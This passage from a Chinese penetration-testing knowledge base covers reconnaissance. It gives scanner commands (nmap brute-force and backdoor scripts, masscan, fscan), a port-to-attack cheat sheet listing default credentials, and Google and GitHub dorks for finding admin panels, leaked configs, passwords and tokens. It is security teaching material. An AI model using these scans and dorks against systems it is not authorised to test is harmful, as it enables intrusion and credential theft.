--script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version,ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute msscan https://github.com/robertdavidgraham/masscan 扫描速度很快，但是精准度不够，速率高了漏报可能比较多 masscan -p80,8000-8100 10.0.0.0/8 --rate=10000 masscan_to_nmap masscan扫描速度快，nmap扫描慢但是准确度高，那么是不是可以给他俩缝合起来呢？ 当然是可以的，可以选择自己造轮子也可以选择网上别写造好的 推荐一个：https://github.com/7dog7/masscan_to_nmap Goby https://cn.gobies.org/ Goby的优势是方便直观，支持图形化，且支持POC进行漏洞扫描，可自定义POC shuize https://github.com/0x727/ShuiZe_0x727 水泽自带资产探活、支持漏洞验证、Host碰撞 python3 ShuiZe.py -c 192.168.1.0,192.168.2.0,192.168.3.0 fscan https://github.com/shadow1ng/fscan 扫描速度快，支持漏洞验证 fscan.exe -h ip/24 fscan.exe -h 192.168.1.1 -p 1-65535 ALLin https://github.com/P1-Team/AlliN 一款红队信息搜集工具，被动识别访问站点是否是云上站点 python3 AlliN.py --host 10.1.1.1/24 -p 80 -m pscan Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 09:23:02 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/04.组合工具.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/04.组合工具.html","title":"04.组合工具","keywords":"","body":" 组合工具 Ehole AlliN 组合工具 如果能快速的获取C段情况，然后验证目标网站的存活性，获取title、架构、组件、框架、使用产品等信息，可以帮我们节省大量时间 当然也有人已经写好了，自己比较闲或者想锻炼的话，也可以自己开发。 Ehole https://github.com/EdgeSecurityTeam/EHole EHole是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统(如OA、VPN、Weblogic...)。EHole旨在帮助红队人员在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。 AlliN https://github.com/P1-Team/AlliN 一个辅助平常渗透测试项目或者攻防项目快速打点的综合工具，由之前写的工具AG3改名而来。是一款轻便、小巧、快速、全面的扫描工具。多用于渗透前资产收集和渗透后内网横向渗透。工具从项目上迭代了一些懒人功能（比如提供扫描资产文件中，可以写绝大部分的各种形式的链接/CIDR,并在此基础上可以添加任意端口和路径） Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 17:51:12 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/05.浏览器插件.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/05.浏览器插件.html","title":"05.浏览器插件","keywords":"","body":" 浏览器插件 shodan.io Fofa Pro View 浏览器插件 浏览器插件大多是基于服务本身缓存的数据，类似网络空间搜索引擎这种，直接从数据库获取数据，所以结果也具有一定的实效性 shodan.io https://addons.mozilla.org/zh-CN/firefox/addon/shodan_io/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search Fofa Pro View https://addons.mozilla.org/zh-CN/firefox/addon/fofa-pro-view/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 09:30:06 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/06.端口对应渗透（端口渗透备忘录）.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/06.端口对应渗透（端口渗透备忘录）.html","title":"06.端口对应渗透（端口渗透备忘录）","keywords":"","body":" [!NOTE|style:flat] 结合了几个地方的端口备忘录，不过还是觉得凭经验最重要，这些都只是辅助 端口 服务 渗透用途 tcp 20,21 FTP 允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4) tcp 22 SSH 可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等 tcp 23 Telnet 爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令 tcp 25 SMTP 邮件伪造,vrfy/expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑 tcp/udp 53 DNS 允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控 tcp/udp 69 TFTP 尝试下载目标及其的各类重要配置文件 tcp 80-89,443,8440-8450,8080-8089 各种常用的Web服务端口 可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等…… tcp 110 POP3 可尝试爆破,嗅探 tcp 111,2049 NFS 权限配置不当 tcp 137,139,445 Samba 可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等…… tcp 143 IMAP 可尝试爆破 udp 161 SNMP 爆破默认团队字符串,搜集目标内网信息 tcp 389 LDAP ldap注入,允许匿名访问,弱口令 tcp 512,513,514 Linux rexec 可爆破,rlogin登陆 tcp 873 Rsync 匿名访问,文件上传 tcp 1194 OpenVPN 想办法钓VPN账号,进内网 tcp 1352 Lotus 弱口令,信息泄漏,爆破 tcp 1433 SQL Server 注入,提权,sa弱口令,爆破 tcp 1521 Oracle tns爆破,注入,弹shell… tcp 1500 ISPmanager 弱口令 tcp 1723 PPTP 爆破,想办法钓VPN账号,进内网 tcp 2082,2083 cPanel 弱口令 tcp 2181 ZooKeeper 未授权访问 tcp 2601,2604 Zebra 默认密码zerbra tcp 3128 Squid 弱口令 tcp 3312,3311 kangle 弱口令 tcp 3306 MySQL 注入,提权,爆破 tcp 3389 Windows rdp shift后门[需要03以下的系统],爆破,ms12-020 tcp 3690 SVN svn泄露,未授权访问 tcp 4848 GlassFish 弱口令 tcp 5000 Sybase/DB2 爆破,注入 tcp 5432 PostgreSQL 爆破,注入,弱口令 tcp 5900,5901,5902 VNC 弱口令爆破 tcp 5984 CouchDB 未授权导致的任意指令执行 tcp 6379 Redis 可尝试未授权访问,弱口令爆破 tcp 7001,7002 WebLogic Java反序列化,弱口令 tcp 7778 Kloxo 主机面板登录 tcp 8000 Ajenti 弱口令 tcp 8443 Plesk 弱口令 tcp 8069 Zabbix 远程执行,SQL注入 tcp 8080-8089 Jenkins,JBoss 反序列化,控制台弱口令 tcp 9080-9081,9090 WebSphere Java反序列化/弱口令 tcp 9200,9300 ElasticSearch 远程执行 tcp 11211 Memcached 未授权访问 tcp 27017,27018 MongoDB 爆破,未授权访问 tcp 50070,50030 Hadoop 默认端口未授权访问 端口号 端口说明 渗透思路 21/69 FTP/TFTP：文件传输协议 爆破、内网嗅探 22 SSH：远程连接 用户名枚举、爆破 23 Telnet：远程连接 爆破、内网嗅探 25 SMTP：邮件服务 邮件伪造 53 DNS：域名系统 DNS域传送\\DNS缓存投毒\\DNS欺骗\\利用DNS隧道技术刺透防火墙 389 LDAP 未授权访问（通过LdapBrowser工具直接连入） 443 https服务 OpenSSL 心脏滴血（nmap -sV --script=ssl-heartbleed 目标） 445 SMB服务 ms17_010远程代码执行 873 rsync服务 未授权访问 1090/1099 Java-rmi JAVA反序列化远程命令执行漏洞 1352 Lotus Domino邮件服务 爆破：弱口令、信息泄漏：源代码 1433 MSSQL 注入、SA弱口令爆破、提权 1521 Oracle 注入、TNS爆破 2049 NFS 配置不当 2181 ZooKeeper服务 未授权访问 3306 MySQL 注入、爆破、写shell、提权 3389 RDP 爆破、Shift后门、CVE-2019-0708远程代码执行 4848 GlassFish控制台 爆破：控制台弱口令、认证绕过 5000 Sybase/DB2数据库 爆破、注入 5432 PostgreSQL 爆破弱口令、高权限执行系统命令 5632 PcAnywhere服务 爆破弱口令 5900 VNC 爆破：弱口令、认证绕过 6379 Redis 未授权访问、爆破弱口令 7001 WebLogic中间件 反序列化、控制台弱口令+部署war包、SSRF 8000 jdwp JDWP 远程命令执行漏洞（工具） 8080/8089 Tomcat/JBoss/Resin/Jetty/Jenkins 反序列化、控制台弱口令、未授权 8161 ActiveMQ admin/admin、任意文件写入、反序列化 8069 Zabbix 远程命令执行 9043 WebSphere控制台 控制台弱口令https://:9043/ibm/console/logon.jsp、远程代码执行 9200/9300 Elasticsearch服务 远程代码执行 11211 Memcache 未授权访问（nc -vv 目标 11211） 27017 MongoDB 未授权访问、爆破弱口令 50000 SAP 远程代码执行 50070 hadoop 未授权访问 端口号 服务 渗透思路 21 FTP/TFTP/VSFTPD 爆破/嗅探/溢出/后门 22 ssh远程连接 爆破/openssh漏洞 23 Telnet远程连接 爆破/嗅探/弱口令 25 SMTP邮件服务 邮件伪造 53 DNS域名解析系统 域传送/劫持/缓存投毒/欺骗 67/68 dhcp服务 劫持/欺骗 110 pop3 爆破/嗅探 139 Samba服务 爆破/未授权访问/远程命令执行 143 Imap协议 爆破161SNMP协议爆破/搜集目标内网信息 389 Ldap目录访问协议 注入/未授权访问/弱口令 445 smb ms17-010/端口溢出 512/513/514 Linux Rexec服务 爆破/Rlogin登陆 873 Rsync服务 文件上传/未授权访问 1080 socket 爆破 1352 Lotus domino邮件服务 爆破/信息泄漏 1433 mssql 爆破/注入/SA弱口令 1521 oracle 爆破/注入/TNS爆破/反弹shell2049Nfs服务配置不当 2181 zookeeper服务 未授权访问 2375 docker remote api 未授权访问 3306 mysql 爆破/注入 3389 Rdp远程桌面链接 爆破/shift后门 4848 GlassFish控制台 爆破/认证绕过 5000 sybase/DB2数据库 爆破/注入/提权 5432 postgresql 爆破/注入/缓冲区溢出 5632 pcanywhere服务 抓密码/代码执行 5900 vnc 爆破/认证绕过 6379 Redis数据库 未授权访问/爆破 7001/7002 weblogic java反序列化/控制台弱口令 80/443 http/https web应用漏洞/心脏滴血 8069 zabbix服务 远程命令执行/注入 8161 activemq 弱口令/写文件 8080/8089 Jboss/Tomcat/Resin 爆破/PUT文件上传/反序列化 8083/8086 influxDB 未授权访问 9000 fastcgi 远程命令执行 9090 Websphere 控制台爆破/java反序列化/弱口令 9200/9300 elasticsearch 远程代码执行 11211 memcached 未授权访问 27017/27018 mongodb 未授权访问/爆破 端口号 服务 渗透思路 20 ftp_data 爆破、嗅探、溢出、后门 21 ftp_control 爆破、嗅探、溢出、后门 23 telnet 爆破、嗅探 25 smtp 邮件伪造 53 DNS DNS区域传输、DNS劫持、DNS缓存投毒、DNS欺骗、深度利用：利用DNS隧道技术刺透防火墙 67 dhcp 劫持、欺骗 68 dhcp 劫持、欺骗 110 pop3 爆破 139 samba 爆破、未授权访问、远程代码执行 143 imap 爆破 161 snmp 爆破 389 ldap 注入攻击、未授权访问 512 linux r 直接使用rlogin 513 linux r 直接使用rlogin 514 linux r 直接使用rlogin 873 rsync 未授权访问 888 BTLINUX 宝塔Linux主机管理后台/默认帐户：admin｜默认密码：admin 999 PMA 护卫神佩带的phpmyadmin管理后台，默认帐户：root｜默认密码：huweishen.com 1080 socket 爆破：进行内网渗透 1352 lotus 爆破：弱口令、信息泄露：源代码 1433 mssql 爆破：使用系统用户登录、注入攻击 1521 oracle 爆破：TNS、注入攻击 2049 nfs 配置不当 2181 zookeeper 未授权访问 3306 mysql 爆破、拒绝服务、注入 3389 rdp 爆破、Shift后门 4848 glassfish 爆破：控制台弱口令、认证绕过 5000 sybase/DB2 爆破、注入 5432 postgresql 缓冲区溢出、注入攻击、爆破：弱口令 5632 pcanywhere 拒绝服务、代码执行 5900 vnc 爆破：弱口令、认证绕过 5901 vnc 爆破：弱口令、认证绕过 5902 vnc 爆破：弱口令、认证绕过 6379 redis 未授权访问、爆破：弱口令 7001 weblogic JAVA反序列化、控制台弱口令、控制台部署webshell 7002 weblogic JAVA反序列化、控制台弱口令、控制台部署webshell 80 web 常见Web攻击、控制台爆破、对应服务器版本漏洞 443 web 常见Web攻击、控制台爆破、对应服务器版本漏洞 8080 web｜Tomcat｜.. 常见Web攻击、控制台爆破、对应服务器版本漏洞、Tomcat漏洞 8069 zabbix 远程命令执行 9090 websphere 文件泄露、爆破：控制台弱口令、Java反序列 9200 elasticsearch 未授权访问、远程代码执行 9300 elasticsearch 未授权访问、远程代码执行 11211 memcacache 未授权访问 27017 mongodb 爆破、未授权访问 27018 mongodb 爆破、未授权访问 50070 Hadoop 爆破、未授权访问 50075 Hadoop 爆破、未授权访问 14000 Hadoop 爆破、未授权访问 8480 Hadoop 爆破、未授权访问 8088 web 爆破、未授权访问 50030 Hadoop 爆破、未授权访问 50060 Hadoop 爆破、未授权访问 60010 Hadoop 爆破、未授权访问 60030 Hadoop 爆破、未授权访问 10000 Virtualmin/Webmin 服务器虚拟主机管理系统 10003 Hadoop 爆破、未授权访问 5984 couchdb 未授权访问 445 SMB 弱口令爆破，检测是否有ms_08067等溢出 1025 111 NFS 2082 cpanel主机管理系统登陆 （国外用较多） 2083 cpanel主机管理系统登陆 （国外用较多） 2222 DA虚拟主机管理系统登陆 （国外用较多） 2601 zebra路由 2604 zebra路由 3128 代理默认端口,如果没设置口令很可能就直接漫游内网了 3311 kangle主机管理系统登陆 3312 kangle主机管理系统登陆 4440 参考WooYun: 借用新浪某服务成功漫游新浪内网 6082 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 7778 主机控制面板登录 8083 主机管理系统 （国外用较多） 8649 8888 主机管理系统默认端口 9000 fcgi php执行 50000 SAP 命令执行 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 15:07:58 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/","title":"04.其他应用收集","keywords":"","body":"其他应用收集 在web资产有限的情况下，可以通过公众号、小程序和APP等常见的应用来进行渗透，获取冷门资产进行漏洞挖掘，扩大攻击范围 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:28:04 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/01.小程序.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/01.小程序.html","title":"01.小程序","keywords":"","body":" 小程序 企查查 微信APP 小程序 企查查 找到小程序点击即可 微信APP Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:45:42 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/02.公众号.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/02.公众号.html","title":"02.公众号","keywords":"","body":" 公众号 企查查、天眼查 搜狗微信搜索 微信APP 公众号 企查查、天眼查 企查查：https://www.qcc.com/ 天眼查：https://www.tianyancha.com/ 直接搜索相应公司，在菜单栏中找到微信公众号 搜狗微信搜索 https://weixin.sogou.com/ 微信APP Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:41:03 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/03.APP.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/03.APP.html","title":"03.APP","keywords":"","body":" APP信息搜集 七麦数据 豌豆荚 企查查&天眼查 App Store APP信息搜集 七麦数据 https://www.qimai.cn/ 直接搜索可以获取到部分相关的APP [!TIP|style:flat] 但是有些较隐藏的APP直接搜名字还是搜不出来，这个时候我们就会用到七麦一个很方便的功能：同开发者APP [!TIP] 此外，还可以获取APP的历史版本，可能里面存在大量的敏感信息!!! 豌豆荚 使用豌豆荚可以方便的获取到APP的历史版本 企查查&天眼查 App Store 搜索到应用往下滑，其实也是和七麦数据找同开发者APP一样的 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 15:03:19 "},"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/":{"url":"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/","title":"01.CMS识别","keywords":"","body":"识别出目标的指纹信息，可以辅助我们快速的了解目标情况，调整进攻方向。 如：目标使用开源CMS搭建的网站，那我们可以对该开源CMS进行审计，发现一些问题辅助我们进行渗透，还可以混CVE和CNVD Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 09:40:37 "},"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/01.在线平台.html":{"url":"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/01.在线平台.html","title":"01.在线平台","keywords":"","body":"在线平台 bugscaner: http://whatweb.bugscaner.com/look/ 数字观星: https://fp.shuziguanxing.com/#/ 云悉: https://www.yunsee.cn/ （需要注册，以前还好，感觉现在不靠谱，说的提交指纹一周左右给回复，等了一周多都没反应） Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 10:21:52 "},"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/02.工具.html":{"url":"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/02.工具.html","title":"02.工具","keywords":"","body":"工具 其实和在线平台类似，区别就在于使用工具是自己发起请求去判断，而使用在线平台就是它发起请求。 判断无非是基于图标、特殊内容、特殊内容的md5值来判断等等 常用指纹识别工具有： 御剑Web指纹识别 WhatWeb Test404轻量CMS指纹识别+v2.1 椰树 ... 一些Github项目 CMSeeK CMSmap ACMSDiscovery TideFinger AngelSword [!TIP] 有能力可以自己开发，去其糟粕，取其精华，主要是指纹库的维护和更新 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 10:26:36 "},"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/03.浏览器插件.html":{"url":"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/03.浏览器插件.html","title":"03.浏览器插件","keywords":"","body":"浏览器插件是真的方便 wappalyzer https://www.wappalyzer.com/ 好用，真的好用，强烈推荐，直接去插件商店下载就可以了 而且还开源了指纹库：https://github.com/AliasIO/wappalyzer/tree/master/src/technologies Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 10:54:31 "},"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/02.WAF识别/":{"url":"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/02.WAF识别/","title":"02.WAF识别","keywords":"","body":" WAF识别 手动 工具wafw00f WAF识别 主要有两种手法吧，一种是手动，一种是工具 知道了是否有WAF，用的什么WAF，我们才好对症下药 手动 一般来说WAF都会拦截敏感文件下载，如a.sql、a.mdb等，直接添加到网站URL中即可 [!NOTE] 一些WAF可能不防护这些，那么就可以拿一些XSS、SQLI的payload来测试也可 工具wafw00f https://github.com/EnableSecurity/wafw00f [!NOTE] 工具其实就是为了重复手动的操作，原理都是一样的   wafw00f https://blog.gm7.org/ ______ / \\ ( W00f! ) \\ ____/ ,, __ 404 Hack Not Found |`-.__ / / __ __ /\" _/ /_/ \\ \\ / / *===* / \\ \\_/ / 405 Not Allowed / )__// \\ / /| / /---` 403 Forbidden \\\\/` \\ | / _ \\ `\\ /_\\\\_ 502 Bad Gateway / / \\ \\ 500 Internal Error `_____``-` /_/ \\_\\ ~ WAFW00F : v2.1.0 ~ The Web Application Firewall Fingerprinting Toolkit [*] Checking https://blog.gm7.org/ [+] The site https://blog.gm7.org/ is behind Cloudflare (Cloudflare Inc.) WAF. [~] Number of requests: 2 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 11:38:27 "},"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/01.目录扫描.html":{"url":"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/01.目录扫描.html","title":"01.目录扫描","keywords":"","body":" 目录扫描 介绍 工具推荐 目录扫描 介绍 通过目录扫描，我们可能可以发现很多东西，如： 备份文件：www.zip、www.rar、blog.gm7.org.zip等 代码仓库：.git、.svn等（恢复工具github一大堆，关键词githack等，就不单独推荐了，都那样吧） 敏感、隐藏目录：/swagger-ui.html、/env等 ... 渗透前简单的扫个目录，一定是不亏的，说不定就发现了什么秘密呢 [!NOTE|style:flat] 能扫出来什么东西，主要还是取决于自己字典的大小和内容，平时可以多收集整理，以备不时之需 工具推荐 yuhScan: https://github.com/hunyaio/yuhScan 推荐理由：go高并发、支持递归、分组扫描、BUG修复快、熟人可以定制开发 dirmap: https://github.com/H4ckForJob/dirmap 推荐理由：支持递归扫描、功能将会强于DirBuster、Dirsearch、cansina、御剑 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 11:54:13 "},"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/02.Google Hacking.html":{"url":"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/02.Google Hacking.html","title":"02.Google Hacking","keywords":"","body":" Google Hacking 介绍 说明 Hacking 管理后台地址 上传类漏洞地址 注入页面 编辑器页面 目录遍历漏洞 SQL错误 phpinfo 配置文件泄露 数据库文件泄露 日志文件泄露 备份和历史文件泄露 公开文件泄露 邮箱信息 社工信息 Google Hacking 介绍 google作为一款发达的搜索引擎，每天都会爬取各种各样的网站，收录的东西也很多，合理利用Google的搜索语法，可能发现很多敏感的数据信息。 [!TIP|style:flat] 搜索也是一门艺术 比如：filetype:xlsx 身份证 说明 Google检索技巧大全: https://sites.google.com/site/hopeanwang/google%E6%A3%80%E7%B4%A2%E6%8A%80%E5%B7%A7%E5%A4%A7%E5%85%A8 运算符 用途 实际用法实例 \"\"(双引号) 搜索词放在双引号中，代表完全匹配搜索 \"keyword\" *（通配符） * 号代表任何文字，比如想查找\"搜索*擎\"，返回的结果就不仅包含\"搜索引擎\"，还包含了\"搜索收擎\"，\"搜索巨擎\"等内容。 \"搜索*擎\" +（与） 搜索所有包含关键词\"keyword1\"和\"keyword2**\"的中文网页 \"keyword1 keyword2\"\"keyword1+keyword2\" -（非） 搜索去除keyword2的keyword1 \"keyword1 -keyword2\" OR(或) 搜索 A 或者 B \"keyword1 OR keyword2\" ~keyword1 搜索它的同义词 ~喜欢 ~keyword1-keyword2 只搜索同义词,不要原词 ~WORD-WORD 关键词 用途 实际用法实例 allinanchor: 限制搜索的词语是网页中链接内包含的关键词（可使用多个关键词） allinanchor: keyword1 keyword2 allintext: 限制搜索的词语是网页内文包含的关键词（可使用多个关键词） allintext: keyword1 keyword2 cache: 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息 cache:https://www.baidu.com/ filetype/ext: 限制搜索的词语是网页中链接内包含的关键词 filetype:pdf ios开发 -filetype: -filetype:SOMEFILETYPE = 剔除指定文件类型. -filetype:SOMEFILETYPE intitle: 搜索网页标题中包含有特定字符的网页 intitle: 登陆 inurl: 搜索包含有特定字符的URL inurl: ?id= intext: 限制搜索的词语是网页内文包含的关键词 intext:密码 inanchor:keyword 指令返回的结果是导入链接锚文字中包含搜索词的页面 inanchor:关于我们 site: 搜索指定域名的内容 site:www.github.com keywordkeyword site:www.github.com Hacking 一些常用的语法，帮助我们快速定位一些数据，主要还是依赖于上面部分的扩展，抛砖引玉 Google Hacking Database cxsecurity-hacking-dorks 管理后台地址 site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system site:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录 上传类漏洞地址 site:target.com inurl:file site:target.com inurl:upload 注入页面 site:target.com inurl:?id= site:target.com inurl:php?id= 编辑器页面 site:target.com inurl:ewebeditor 目录遍历漏洞 site:target.com intitle: \"index of\" SQL错误 site:target.com intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:”Warning: mysql_query()\" | intext:\"Warning: pg_connect()\" phpinfo site:target.com ext:php intitle:phpinfo \"published by the PHP Group\" 配置文件泄露 site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini 数据库文件泄露 site:target.com ext:.sql | .dbf | .mdb | .db 日志文件泄露 site:target.com ext:.log 备份和历史文件泄露 site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar 公开文件泄露 site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv 邮箱信息 site:target.com intext:@target.com site:target.com 邮件 site:target.com email 社工信息 site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 12:59:19 "},"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/03.GitHub信息收集.html":{"url":"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/03.GitHub信息收集.html","title":"03.GitHub信息收集","keywords":"","body":" 介绍 一些语法 推荐工具 GitDorker 其他平台 介绍 GitHub敏感信息泄露一直是企业信息泄露和知识产权泄露的重灾区，安全意识薄弱的同事经常会将公司的代码、各种服务的账户等极度敏感的信息『开源』到github中；利用github搜索关键词，或者结合特定语法来使用，效果更佳 [!TIP] 一般搜索以域名、特殊JS路径、备案、网站的技术支持等关键内容为主，不要局限于域名 高级搜索：https://github.com/search/advanced 如搜索包含 aliyuncs 和 password 的代码 aliyuncs password 一些语法 参考自：https://github.com/obheda12/GitDorker/tree/master/Dorks 所有语法txt版 alldorksv3 medium_dorks 自己总结的small版 \"token\" \"password\" \"secret\" \"passwd\" \"username\" \"key\" \"apidocs\" \"appspot\" \"auth\" \"aws_access\" \"config\" \"credentials\" \"dbuser\" \"ftp\" \"login\" \"mailchimp\" \"mailgun\" \"mysql\" \"pass\" \"pem private\" \"prod\" \"pwd\" \"secure\" \"ssh\" \"staging\" \"stg\" \"stripe\" \"swagger\" \"testuser\" \"jdbc\" 推荐工具 查询过程也是重复性工作，可以借助工具来进行查找 [!DANGER] 工具毕竟是死板的，最好还是人工+工具一起 GitDorker https://github.com/obheda12/GitDorker GitDorker 是一款github自动信息收集工具，它利用 GitHub 搜索 API 和作者从各种来源编译的大量 GitHub dorks 列表，以提供给定搜索查询的 github 上存储的敏感信息的概述。 其他平台 GitLab: https://about.gitlab.com/ gitee: https://gitee.com/ Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 14:48:15 "},"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/04.JS信息收集.html":{"url":"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/04.JS信息收集.html","title":"04.JS信息收集","keywords":"","body":" JS信息收集 介绍 工具 JSFinder LinkFinder Hae JS信息收集 介绍 在JS中可能会存在大量的敏感信息，包括但不限于： 某些服务的接口，可以测试这些接口是否有未授权等 子域名，可能包含有不常见或者子域名收集过程中没收集到的目标 密码、secretKey等敏感数据 可以全局搜索http、\"/、这种关键词 工具 每个网站都拥有大量的js文件，明显一个个手动去判断是不现实的，既然是重复性的工作，那么就肯定可以用工具来完成，这里推荐几个常用的工具吧 JSFinder https://github.com/Threezh1/JSFinder JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具 用法参考项目文档，或者-h，不多说了 LinkFinder https://github.com/GerbenJavado/LinkFinder 这也是一款一直在用的工具，效果杠杠的，可以本地用，也可以集成到Burp插件里面 具体还是看README文档吧 Hae https://github.com/gh0stkey/HaE HaE是基于 BurpSuite 插件 JavaAPI 开发的请求高亮标记与信息提取的辅助型插件。 基于正则表达式，除了提取敏感信息，也可以提取页面中的链接等，所以也在这写写记录下 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 09:41:03 "},"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/05.网盘信息收集.html":{"url":"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/05.网盘信息收集.html","title":"05.网盘信息收集","keywords":"","body":" 介绍 在线云盘 搜索 百度网盘爬虫 介绍 某些安全意识薄弱的人员可能上传资料到一些网盘中，没有加密码或者密码泄露，然后被一些在线云盘抓取收录了，导致信息泄露。 在线云盘 [!NOTE] 直接网上一搜就有一大堆，因为不知道什么时候它会挂掉，建议多试几个 搜索 搜索建议一般以目标关键词为主，如单位名、单位别称等 百度网盘爬虫 [!WARNING] 没有实际试过，不知道效果咋样 https://github.com/search?q=%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%88%AC%E8%99%AB Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 11:29:38 "},"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/06.邮箱信息收集.html":{"url":"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/06.邮箱信息收集.html","title":"06.邮箱信息收集","keywords":"","body":" 邮箱信息收集 寻找目标邮箱入口 通过扫描C段 通过子域名 通过搜索引擎 在线平台收集 工具收集 验证邮箱 通过mailtester.com 使用verifyemail 使用snov.io 邮箱爆破 邮箱信息收集 